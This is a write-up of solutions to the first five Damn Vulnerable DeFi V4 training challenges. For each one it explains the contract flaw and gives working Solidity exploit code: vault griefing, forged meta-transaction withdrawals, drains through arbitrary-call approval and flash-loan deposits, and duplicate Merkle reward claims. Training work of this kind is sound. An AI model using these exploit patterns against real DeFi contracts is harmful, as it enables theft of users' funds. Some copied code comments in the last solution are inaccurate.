# Damn Vulnerable DeFi

This is solutions of [Damn Vulnerable DeFi V4](https://www.damnvulnerabledefi.xyz)

### 1. Unstoppable

This topic is about vault flashloan. The idea comes from flashloan function that doing check in total supply and total assets. Let's see following the code below :

<details>

<summary> code </summary>

```javascript
function flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amount, bytes calldata data)
        external
        returns (bool)
    {
        if (amount == 0) revert InvalidAmount(0); // fail early
        if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement
        uint256 balanceBefore = totalAssets();
@>        if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement

        // transfer tokens out + execute callback on receiver
        ERC20(_token).safeTransfer(address(receiver), amount);

        // callback must return magic value, otherwise assume it failed
        uint256 fee = flashFee(_token, amount);
        if (
            receiver.onFlashLoan(msg.sender, address(asset), amount, fee, data)
                != keccak256("IERC3156FlashBorrower.onFlashLoan")
        ) {
            revert CallbackFailed();
        }

        // pull amount + fee from receiver, then pay the fee to the recipient
        ERC20(_token).safeTransferFrom(address(receiver), address(this), amount + fee);
        ERC20(_token).safeTransfer(feeRecipient, fee);

        return true;
    }

```

</details>

There is a difference between `totalSupply` and `totalAssets`. The `totalSupply` refers to the total amount of tokens that the `vault` has minted. Then, the `totalAssets` refers to all amount token DVT that the `vault` holds. So, if someone makes a transfer to `vault` with token DVT, The `totalAssets` will increase, creating a mismatch between `totalSupply` and `totalAssets`.

<details>

<summary> Solution </summary>

```javascript
    function test_unstoppable() public checkSolvedByPlayer {
        require(token.transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE));
    }
```

</details>

### 2. Naive Receiver

In this topic, we work with flashloan, delegatecall and EIP-712 as well. In this case, the aims of the chalengge is moving all funds into recovery address and spending player funds. If we are not working with delegatecall, it is difficult to imagine how we would have difficult with it. Also, EIP-712 has it's own difficulty. In short, i have a scenario that :
- make 10 flashloans to spend player funds
- make one transaction to move all of funds to the recovery address
- keep all commands with the encode function with ABI
- At my difficulty, changing the format to EIP-712 is the hardest part

<details>

<summary> Solution </summary>

```javascript
function test_naiveReceiver() public checkSolvedByPlayer {
        bytes[] memory callDatas = new bytes[](11);
        for(uint8 i; i<10; i++){
            callDatas[i] = abi.encodeCall(pool.flashLoan, (receiver, address(weth), 0, ""));
        }
        callDatas[10] = abi.encodePacked(abi.encodeCall(pool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))), bytes32(uint256(uint160(deployer))));        
        bytes memory message = abi.encodeCall(pool.multicall, callDatas);
        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: 30000000,
            nonce: forwarder.nonces(player),
            data: message,
            deadline: 1 days
        });

       bytes32 messageHash = keccak256(abi.encodePacked(
        "\x19\x01", 
        forwarder.domainSeparator(),
        forwarder.getDataHash(request)
       ));

       (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, messageHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        forwarder.execute(request, signature);
    }

```

</details>

### 3. Truster

Also in this topic, we work again with flashloan. The story that is the deployer sends many funds to the lender pool. If we are serious about reading the code, there are many things that look weird. Let focus with the following code below : 

<details>

<summary> Code </summary>

```javascript
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        external
        nonReentrant
        returns (bool)
    {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);
@>      target.functionCall(data);

@>      if (token.balanceOf(address(this)) < balanceBefore) {
@>          revert RepayFailed();
        }

        return true;
    }
```

</details>

After seing the code, we must have some questions. Why does the protocol allow the low-level calls with unclear purposes? It can enable a players to set up the protocol at their will. So, the scenario would be :
- Take a flashloan with a zero amount
- Using a low-level call to get approval from the protocol for the attacker's address
- the attacker makes the transfer directly with the address token.

<details>

<summary> Solution </summary>

```javascript
function test_truster() public checkSolvedByPlayer {
        MaliciousUser attacker = new MaliciousUser(address(token), address(pool), recovery);
        attacker.attack();
    }

contract MaliciousUser {
    DamnValuableToken token;
    TrusterLenderPool pool;
    address recovery;

    constructor(address _token, address _pool, address _recovery){
        token = DamnValuableToken(_token);
        pool = TrusterLenderPool(_pool);
        recovery = _recovery;
    }

    function attack() public {
        uint256 amountOfPool = token.balanceOf(address(pool));

        pool.flashLoan({
            amount: 0,
            borrower: address(this),
            target: address(token),
            data: abi.encodeWithSignature("approve(address,uint256)", address(this), amountOfPool)
        });

        token.transferFrom(address(pool), recovery, amountOfPool);
    }
    
}
```

</details>

### 4. Side Entrance

In many case above, the format of the funds is wrapped by an ERC-2O token. But here, the flashloan is provided with native ether. The problem arise with slippage protection. Let's jump into the code : 

<details>

<summary> Code </summary>

```javascript
 function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

@>      if (address(this).balance < balanceBefore) {
            revert RepayFailed();
        }
    }
```

</details>

The vulnerability lies in slippage when the protocol checks the total balance before and after transactions. So, i have an idea that we can take a flashloan. After that, we make a deposit directly to ensure that the total balance before and after transaction stays same. Let's jump into this scenario :
- The attacker take a flashloan with all of amount the pool
- After that, the attacker make a deposit to the pool to make total balances stay same
- The attacker send to the balance to the recovery account

<details>

<summary> Solution </summary>

```javascript
 function test_sideEntrance() public checkSolvedByPlayer {
        MaliciousUser attacker = new MaliciousUser(address(pool));
        attacker.attack();
        attacker.sendToRecovery(recovery);
    }

contract MaliciousUser is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    function attack() public {
        uint256 amountOfPool = address(pool).balance;
        pool.flashLoan(amountOfPool);
    }

    function execute() external payable {
        pool.deposit{value: address(this).balance}();
    }

    function sendToRecovery(address _recovery) public {
        pool.withdraw();

        (bool sucsess, ) = _recovery.call{value: address(this).balance}("");
        require(sucsess, "Send failed");
    }

    receive() external payable {}
}

```

</details>

### 5. The rewarder

Let’s break down the `test_theRewarder` function, which is designed to interact with a reward distribution system in a DeFi application. This function involves claiming rewards from a distribution contract and then transferring the claimed rewards to a recovery address.

#### Function Breakdown

<details>

<summary> Code </summary>


```javascript
function test_theRewarder() public checkSolvedByPlayer {
    IERC20[] memory tokensToClaim = new IERC20[](2);
    tokensToClaim[0] = IERC20(address(dvt));
    tokensToClaim[1] = IERC20(address(weth));

    bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
    bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");

    uint256 player_amount_dvt = 11524763827831882;
    uint256 player_amount_weth = 1171088749244340;

    uint256 txDvt = TOTAL_DVT_DISTRIBUTION_AMOUNT / player_amount_dvt;
    uint256 txWeth = TOTAL_WETH_DISTRIBUTION_AMOUNT / player_amount_weth;
    uint256 txTotal = txDvt + txWeth;

    Claim[] memory claimsOfPlayer = new Claim[](txTotal);
    for(uint i; i < txTotal; i++){
        if(i < txDvt){
            claimsOfPlayer[i] = Claim({
                batchNumber: 0, // claim corresponds to first DVT batch
                amount: player_amount_dvt,
                tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
                proof: merkle.getProof(dvtLeaves, 188) // Alice's address is at index 2
            });  
        }else{
            claimsOfPlayer[i] = Claim({
                batchNumber: 0, // claim corresponds to first DVT batch
                amount: player_amount_weth,
                tokenIndex: 1, // claim corresponds to second token in `tokensToClaim` array
                proof: merkle.getProof(wethLeaves, 188) // Alice's address is at index 2
            });
        }
    }
    
    distributor.claimRewards({inputClaims: claimsOfPlayer, inputTokens: tokensToClaim});
    weth.transfer(recovery, weth.balanceOf(player));
    dvt.transfer(recovery, dvt.balanceOf(player));
}
```

</details>

#### Detailed Explanation

1. **Define Tokens to Claim:**
   ```javascript
   IERC20[] memory tokensToClaim = new IERC20[](2);
   tokensToClaim[0] = IERC20(address(dvt));
   tokensToClaim[1] = IERC20(address(weth));
   ```
   - Create an array `tokensToClaim` that holds two ERC20 tokens: `dvt` and `weth`. These are the tokens from which rewards will be claimed.

2. **Load Merkle Tree Leaves:**
   ```javascript
   bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
   bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
   ```
   - Load the Merkle tree leaves for DVT and WETH distributions from JSON files. These leaves will be used to prove the validity of the claims.

3. **Define Amounts and Calculations:**
   ```javascript
   uint256 player_amount_dvt = 11524763827831882;
   uint256 player_amount_weth = 1171088749244340;
   ```
   - These are the amounts of DVT and WETH that the player is expected to claim.

   ```javascript
   uint256 txDvt = TOTAL_DVT_DISTRIBUTION_AMOUNT / player_amount_dvt;
   uint256 txWeth = TOTAL_WETH_DISTRIBUTION_AMOUNT / player_amount_weth;
   uint256 txTotal = txDvt + txWeth;
   ```
   - Calculate the number of claims needed for both DVT and WETH based on the total distribution amount and the player’s claim amounts. `txTotal` represents the total number of claims.

4. **Create Claims Array:**
   ```javascript
   Claim[] memory claimsOfPlayer = new Claim[](txTotal);
   for(uint i; i < txTotal; i++){
       if(i < txDvt){
           claimsOfPlayer[i] = Claim({
               batchNumber: 0, // claim corresponds to first DVT batch
               amount: player_amount_dvt,
               tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
               proof: merkle.getProof(dvtLeaves, 188) // Alice's address is at index 2
           });  
       }else{
           claimsOfPlayer[i] = Claim({
               batchNumber: 0, // claim corresponds to first DVT batch
               amount: player_amount_weth,
               tokenIndex: 1, // claim corresponds to second token in `tokensToClaim` array
               proof: merkle.getProof(wethLeaves, 188) // Alice's address is at index 2
           });
       }
   }
   ```
   - Initialize an array `claimsOfPlayer` of size `txTotal`. Each entry in the array is a `Claim` object.
   - Loop through the total claims and populate each `Claim` object based on whether it is for DVT or WETH. Use Merkle proofs for each claim to validate it.

5. **Claim Rewards:**
   ```javascript
   distributor.claimRewards({inputClaims: claimsOfPlayer, inputTokens: tokensToClaim});
   ```
   - Call the `claimRewards` function on the `distributor` contract to claim the rewards using the `claimsOfPlayer` and `tokensToClaim` arrays.

6. **Transfer Claimed Tokens:**
   ```javascript
   weth.transfer(recovery, weth.balanceOf(player));
   dvt.transfer(recovery, dvt.balanceOf(player));
   ```
   - Transfer the entire balance of WETH and DVT held by the player to a recovery address. This action ensures that the claimed rewards are moved to a secure address.

#### Summary

The `test_theRewarder` function is designed to:
- Prepare and submit claims for rewards from a reward distribution contract.
- Use Merkle proofs to authenticate the claims.
- Transfer the claimed rewards to a specified recovery address.

This function is typically used to demonstrate how to exploit vulnerabilities in reward distribution mechanisms or to ensure the correct implementation of reward claiming logic in a DeFi application.